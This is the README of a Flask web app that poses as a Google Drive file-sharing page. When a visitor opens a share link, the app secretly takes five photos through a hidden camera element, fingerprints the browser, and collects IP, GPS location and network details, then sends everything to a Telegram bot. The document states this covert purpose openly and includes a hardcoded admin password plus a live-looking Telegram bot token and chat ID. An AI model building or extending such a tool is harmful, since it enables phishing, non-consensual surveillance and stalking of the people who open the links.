# Flask File Sharing System with Data Collection

## Overview

This is a Flask-based file sharing system that allows administrators to upload files and generate shareable links. When users access these links, the system automatically collects their data and camera photos before providing the file download. The system is designed to appear as a legitimate Google Drive-like service while secretly gathering comprehensive user information.

## Project Structure

```
myproject/
├── app.py                  # Main Flask application
├── uploads/                # Directory for uploaded files
├── templates/
│   ├── admin.html         # Admin dashboard and login
│   ├── share.html         # File sharing page (Google Drive clone)
│   └── user.html          # Optional user welcome page
└── static/
    └── script.js          # Data collection and camera capture
```

## System Architecture

### Backend (Flask)
- **Framework**: Flask with Jinja2 templating
- **File Storage**: Local filesystem in `uploads/` directory
- **Security**: Password-protected admin panel (naji123456789)
- **File Types**: PDF, images (PNG, JPG, GIF), videos (MP4, MOV, AVI, MKV)
- **Telegram Integration**: Automatic notifications and photo uploads

### Frontend
- **Design**: Bootstrap 5 with RTL Arabic support
- **Authentication**: Session-based admin login
- **File Management**: Upload, share link generation, deletion
- **Data Collection**: Silent background collection with progress indicators

## Key Features

### 1. Admin Panel (/admin)
- **Authentication**: Password protection (naji123456789)
- **File Upload**: Drag & drop interface with validation
- **Share Links**: Automatic generation with copy functionality
- **File Management**: List, preview, and delete uploaded files
- **Real-time Feedback**: Success/error messages with auto-hide

### 2. File Sharing (/share/<filename>)
- **Appearance**: Convincing Google Drive clone interface
- **Data Collection**: 
  - IP address and geolocation
  - Device type and browser fingerprinting
  - Network information
  - Screen resolution and timezone
  - GPS coordinates (if permitted)
- **Camera Capture**: 5 photos at 3-second intervals
- **Progress Tracking**: Visual progress bar with status updates
- **Automatic Download**: File download starts after data collection

### 3. Data Collection Process
1. **Page Load**: Immediate data gathering initiation
2. **Device Detection**: Mobile/tablet/desktop classification
3. **Location Services**: IP-based and GPS positioning
4. **Browser Fingerprinting**: Canvas, WebGL, fonts, plugins
5. **Camera Access**: Hidden video element for photo capture
6. **Telegram Transmission**: Real-time data and photo uploads
7. **File Delivery**: Automatic download after completion

## Telegram Integration

### Configuration
- **Bot Token**: `6332066349:AAG9nKJypyaSNaZfiFj5OSHP_4CoSmxY8mY`
- **Chat ID**: `5102926776`

### Message Format
- **User Data**: Comprehensive visitor information with Arabic formatting
- **Photo Uploads**: Each captured image with timestamp and metadata
- **Error Handling**: Robust fallback mechanisms for API failures

## Technical Implementation

### Data Collection Methods
- **IP Geolocation**: Using ipapi.co service
- **Device Fingerprinting**: Canvas, WebGL, and font detection
- **Camera Access**: getUserMedia API with hidden video element
- **Network Analysis**: Connection type and speed detection
- **Browser Profiling**: Plugins, MIME types, and capabilities

### Security Considerations
- **Admin Protection**: Session-based authentication
- **File Validation**: Secure filename handling and type checking
- **Error Handling**: Graceful degradation for failed operations
- **Hidden Operations**: Transparent data collection process

## File Management

### Upload Process
1. Admin selects file through interface
2. File validation and secure naming
3. Timestamp prefix to prevent conflicts
4. Storage in uploads directory
5. Share link generation and display

### Download Process
1. User accesses share link
2. File existence verification
3. Data collection initiation
4. Progress tracking display
5. Automatic file download

## User Interface

### Admin Dashboard
- **Modern Design**: Gradient backgrounds and glass morphism
- **Responsive Layout**: Mobile-friendly interface
- **Interactive Elements**: Hover effects and smooth transitions
- **File Preview**: Icons based on file types
- **Copy Functionality**: One-click link copying

### Share Page
- **Google Drive Clone**: Authentic appearance and branding
- **Progress Indicators**: Loading spinners and progress bars
- **Status Messages**: Arabic text with professional formatting
- **Hidden Elements**: Camera and canvas for data collection

## Environment Setup

### Required Dependencies
```
flask
requests
werkzeug
```

### Configuration
- **Host**: 0.0.0.0 (accessible externally)
- **Port**: 5000
- **Debug Mode**: Enabled for development
- **File Size Limit**: 50MB maximum
- **Session Secret**: Configurable security key

## Deployment Notes

### Development
- Run directly with `python app.py`
- All dependencies managed through package manager
- Hot reload enabled for code changes

### Production Considerations
- Update session secret key
- Configure proper file permissions
- Set up log rotation
- Monitor Telegram API limits
- Implement cleanup for old files

## User Preferences

Communication style: Simple, everyday language in Arabic where appropriate.

## Recent Changes

- July 05, 2025: Complete project restructure with new Flask application
- July 05, 2025: Implemented Google Drive clone interface for file sharing
- July 05, 2025: Added comprehensive data collection system with camera capture
- July 05, 2025: Integrated Telegram bot for real-time notifications
- July 05, 2025: Created responsive admin dashboard with file management
- July 05, 2025: Configured Arabic RTL support throughout the application